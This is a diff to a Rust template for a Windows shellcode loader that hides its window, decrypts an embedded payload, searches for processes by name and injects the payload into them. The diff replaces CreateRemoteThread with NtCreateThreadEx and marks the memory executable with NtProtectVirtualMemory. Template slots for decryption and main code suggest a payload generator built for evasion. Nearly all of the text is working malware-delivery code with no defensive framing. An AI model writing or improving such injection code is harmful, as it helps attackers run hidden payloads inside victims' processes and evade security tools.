@@ -1,7 +1,6 @@
 #![windows_subsystem = "windows"]
 
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
 use std::include_bytes;
 
 use winapi::{
@@ -21,23 +20,24 @@ use ntapi::ntpsapi::NtOpenProcess;
 use ntapi::ntmmapi::NtAllocateVirtualMemory;
 use ntapi::ntmmapi::NtWriteVirtualMemory;
 use ntapi::ntmmapi::NtProtectVirtualMemory;
+use ntapi::ntpsapi::NtCreateThreadEx;
 
 {{IMPORTS}}
 
 {{DECRYPTION_FUNCTION}}
 
-fn boxboxbox(tar: &str) -> Vec<u32> {
+fn boxboxbox(tar: &str) -> Vec<usize> {
     // search for processes to inject into
-    let mut dom: Vec<u32> = Vec::new();
+    let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
     for pro in s.processes_by_exact_name(tar) {
         //println!("{} {}", pro.pid(), pro.name());
-        dom.push(pro.pid().as_u32());
+        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
     }
     return dom;
 }
 
-fn enhance(buf: &Vec<u8>, tar: &u32) {
+fn enhance(mut buf: Vec<u8>, tar: usize) {
     // injecting in target processes :)
     let mut process_handle = tar as HANDLE;
     let mut oa = OBJECT_ATTRIBUTES::default();
@@ -62,7 +62,7 @@ fn enhance(buf: &Vec<u8>, tar: &u32) {
         }
         let mut byteswritten = 0;
         let buffer = buf.as_mut_ptr() as *mut c_void;
-        let buffer_length = buf.len();
+        let mut buffer_length = buf.len();
         let write_status = NtWriteVirtualMemory(process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
         if !NT_SUCCESS(write_status) {
             panic!("Error writing to the target process: {}", write_status);
@@ -75,9 +75,11 @@ fn enhance(buf: &Vec<u8>, tar: &u32) {
             Some(&mut byteswritten),
         );
         */
-        let mut old_perms = PAGE_EXECUTE_READWRITE;
-        let protect_status = NtProtectVirtualMemory(process_handle, allocstart, buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
-
+        let mut old_perms = PAGE_READWRITE;
+        let protect_status = NtProtectVirtualMemory(process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
+        if !NT_SUCCESS(protect_status) {
+            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
+        }
         /* 
         let _bool = VirtualProtectEx(
             h_process,
@@ -87,16 +89,14 @@ fn enhance(buf: &Vec<u8>, tar: &u32) {
             &mut old_perms,
         );
         */
-        let _res_crt = CreateRemoteThread(
-            h_process,
-            None,
-            0,
-            Some(std::mem::transmute(result_ptr)),
-            None,
-            0,
-            None,
-        )
-        .unwrap();
+        let mut thread_handle : *mut c_void = null_mut();
+        let handle = process_handle as *mut c_void;
+        let write_thread = NtCreateThreadEx(&mut thread_handle, GENERIC_ALL, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
+        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, lol1, handle, allocstart, lol2, 0, 0, 0, 0, lol3);
+
+        if !NT_SUCCESS(write_thread) {
+            panic!("Error failed to create remote thread: {}", write_thread);
+        }
     }
 }
 
@@ -109,13 +109,13 @@ fn main() {
     for i in buf.iter() {
         vec.push(*i);
     }
-    let list: Vec<u32> = boxboxbox(tar);
+    let list: Vec<usize> = boxboxbox(tar);
     if list.len() == 0 {
         panic!("[-] Unable to find a process.")
     } else {
         for i in &list {
             {{MAIN}}
-            enhance(&vec, i);
+            enhance(vec.clone(), *i);
         }
     }
 }
